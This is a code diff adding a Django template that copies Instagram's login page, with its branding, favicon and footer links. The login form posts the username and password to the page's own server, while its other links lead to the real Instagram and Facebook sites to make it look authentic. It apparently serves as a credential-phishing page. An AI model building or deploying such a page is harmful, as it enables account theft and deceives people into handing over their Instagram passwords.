@@ -1,0 +1,93 @@
+{%extends 'base.html' %}
+{% load static %}
+
+{%block title%}
+Instagram </title>
+<link rel="icon" href="{% static '/images/instagram.ico' %}">
+{%endblock%}
+
+{%block stylesheet %}
+<link rel="stylesheet" href="{% static '/css/login.css' %}">
+{%endblock%}
+
+{%block content%}
+
+<section class="top_section">
+
+    <div class="left_side">
+        <img src="{%static '/images/phone.png'%}" alt="Phone">
+        <img class="screen" src="{%static '/images/screenshot1.png'%}" alt="Screen">
+    </div>
+
+    <div class=" right_side">
+
+        <div class="panel login">
+            <img class="logo" src="{%static '/images/instagram-logo.png'%}" alt="Logo">
+            <form method="post">
+            {% csrf_token %}
+                <input type="text" class="inputbox" name="username" placeholder="Phone number, username or email" required>
+                <input type="password" class="inputbox" name="password" placeholder="Password" required>
+                <input type="submit" class="button" value="Log in">
+
+                <div class="divider">
+                    <div class="line">
+                    </div>
+                    <p>OR</p>
+                    <div class="line">
+                    </div>
+                </div>
+
+                <div class="fb_login">
+                    <img class="fb-img" src="{%static '/images/fb.png'%}" alt="facebook">
+                    <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221powj198erdio1ikhf5c1d0eh66ibu26a1t5lwxl1axhbgxpaukey%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Decdd2332-f54e-480a-b4f4-67c9fa70159c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221powj198erdio1ikhf5c1d0eh66ibu26a1t5lwxl1axhbgxpaukey%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">Log In with Facebook</a><br>
+                </div>
+
+                <a class="forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot Password</a>
+            </form>
+        </div>
+        {% for i in messages %}           
+            {{i}}  
+        {% endfor %}
+
+        <div class="panel signup">
+            <P>Don't have an account?</P>
+            <a href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a>
+        </div>
+
+        <div class="panel apps">
+            <p>Get the app.</p>
+
+            <div class="app-store">
+                <img class="app_store_img1" src="{%static '/images/googlePlay.png'%}" alt="Playstore">
+                <img class="app_store_img2" src="{%static '/images/microsoft.png'%}" alt="Microsoft Store">
+            </div>
+
+        </div>
+    </div>
+</section>
+
+<footer>
+
+    <ul>
+        <a href="https://about.meta.com/">Meta</a>
+        <a href="https://about.instagram.com/">About</a>
+        <a href="https://about.instagram.com/en_US/blog">Blog</a>
+        <a href="https://about.instagram.com/about-us/careers">Jobs</a>
+        <a href="https://help.instagram.com/">Help</a>
+        <a href="https://developers.facebook.com/docs/instagram">API</a>
+        <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a>
+        <a href="https://help.instagram.com/581066165581870/">Terms</a>
+        <a href="https://www.instagram.com/directory/profiles/">Top Accounts</a>
+        <a href="https://www.instagram.com/explore/locations/">Locations</a>
+        <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+        <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Useres</a>
+    </ul>
+
+    <ul class="last_footer">
+        <li>English</li>
+        <li>&copy; 2023 Instagram from Meta</li>     
+    </ul>
+
+</footer>
+
+{%endblock%}
